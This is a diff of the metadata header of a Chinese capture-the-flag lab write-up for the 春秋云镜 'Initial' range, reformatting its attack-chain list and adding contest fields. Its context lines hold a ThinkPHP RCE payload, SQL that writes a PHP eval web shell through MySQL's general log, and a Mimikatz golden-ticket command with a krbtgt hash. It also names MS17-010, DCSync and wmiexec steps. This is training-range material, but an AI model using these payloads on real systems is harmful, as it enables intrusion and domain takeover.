@@ -12,7 +12,17 @@ tags:
 - MS17-010
 - 黄金票据
 - Kerberos
-attack_chain: ThinkPHP5023 RCE→写入一句话→蚁剑→sudo mysql -e提权flag1→frp代理→信呼OA+phpMyAdmin写shell flag2→MS17-010打WIN7→kiwi dcsync导出krbtgt hash→伪造黄金票据→wmiexec登录DC读flag3
+attack_chain:
+- 'ThinkPHP5023 RCE'
+- '写入一句话'
+- '蚁剑'
+- 'sudo mysql -e提权flag1'
+- 'frp代理'
+- '信呼OA+phpMyAdmin写shell flag2'
+- 'MS17-010打WIN7'
+- 'kiwi dcsync导出krbtgt hash'
+- '伪造黄金票据'
+- 'wmiexec登录DC读flag3'
 key_payload: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;set global general_log='ON';set global general_log_file='C:/phpStudy/PHPTutorial/WWW/111.php';select '<?php eval($_POST[cmd]);?>';kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt
 one_liner: 春秋云镜Initial完整打靶：ThinkPHP+信呼OA+MS17-010+黄金票据四步全flag
 lesson: 入门靶场三种getshell姿势（ThinkPHP/信呼上传/phpMyAdmin日志写马）+ Kerberos黄金票据原理与利用
@@ -61,6 +71,8 @@ prerequisites:
 - phpMyAdmin 日志写马（general_log）
 - MS17-010
 - Mimikatz kerberos::golden 黄金票据伪造
+contest_normalized: "春秋云镜靶场"
+contest_year: 2024
 ---
 # 春秋云镜-Initial打靶记录
 
